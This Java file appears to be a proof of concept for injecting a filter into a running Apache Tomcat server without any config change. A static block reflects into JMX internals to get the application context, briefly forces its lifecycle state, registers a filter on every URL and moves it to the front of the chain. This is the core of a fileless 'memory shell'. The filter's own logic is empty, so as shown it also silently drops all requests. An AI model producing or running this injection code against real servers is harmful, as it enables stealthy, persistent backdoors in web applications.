package com.reinject.test;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.deploy.FilterMap;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Map;

public class TestApplicationContextAddFilter implements Filter {

    private static final String filterName = "ttt";

    private static final String urlPatern = "/*";

    static {
        try {
            StandardContext standardContext = null;
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            // 获取mbsInterceptor
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            // 获取repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            // 获取domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String,Map<String,NamedObject>>)field.get(repository);
            // 获取domain
            NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/,host=localhost,name=NonLoginAuthenticator,type=Valve");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            Object object = field.get(nonLoginAuthenticator);
            // 获取resource
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object resource = field.get(object);
            // 获取context
            field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
            field.setAccessible(true);
            standardContext = (StandardContext) field.get(resource);

            // Fix State
            java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
            // Define
            ApplicationContext applicationContext = new ApplicationContext(standardContext);
            Filter filter = new TestApplicationContextAddFilter();
            // Registe Filter
            FilterRegistration.Dynamic filterRegistration = applicationContext.addFilter(filterName, filter);
            // Create Map for urlPattern
            filterRegistration.addMappingForUrlPatterns(EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{urlPatern});
            // Restore State
            stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
            // Order
            Object[] filterMaps = standardContext.findFilterMaps();
            Object[] tmpFilterMaps = new Object[filterMaps.length];
            int index = 1;
            for (int i = 0; i < filterMaps.length; i++)
            {
                FilterMap f = (FilterMap) filterMaps[i];
                if (f.getFilterName().equalsIgnoreCase(filterName)) {
                    tmpFilterMaps[0] = f;
                } else {
                    tmpFilterMaps[index++] = f;
                }
            }
            for (int i = 0; i < filterMaps.length; i++) {
                filterMaps[i] = tmpFilterMaps[i];
            }
            System.out.println("Test Add Filter................");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

    }

    @Override
    public void destroy() {

    }
}
